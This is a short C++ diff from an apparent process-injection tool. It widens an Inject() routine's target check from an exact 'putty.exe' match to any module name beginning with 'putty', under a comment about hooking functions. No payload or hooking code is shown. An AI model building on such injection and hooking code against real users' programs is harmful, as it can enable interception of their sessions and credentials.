@@ -157,7 +157,7 @@ void Inject()
 
 		// putty.exe
 
-		else if(Utils::ToLower(vDlls[i].szModule).compare("putty.exe") == 0)
+		else if(Utils::ToLower(vDlls[i].szModule).substr(0, 5).compare("putty") == 0)
 		{
 			// Hook Chrome functions
 
